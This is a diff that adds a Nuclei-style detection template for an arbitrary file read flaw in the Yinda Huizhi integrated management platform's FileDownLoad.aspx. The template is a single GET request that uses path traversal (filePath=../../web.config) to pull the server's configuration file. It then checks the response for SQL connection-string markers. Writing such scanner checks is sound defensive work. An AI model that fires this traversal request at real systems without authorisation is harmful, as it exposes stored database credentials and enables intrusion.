@@ -1,0 +1,25 @@
+id: ydhz-integrated-management-platform-arbitrary-file-read
+info:
+  name: 银达汇智 智慧综合管理平台 FileDownLoad.aspx 任意文件读取漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: file-read
+  metadata:
+    product: ASP.NET
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/Module/FileManagement/FileDownLoad.aspx?filePath=../../web.config"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "System.Data.SqlClient"
+      - type: word
+        part: body
+        words:
+          - "<connectionStrings>"
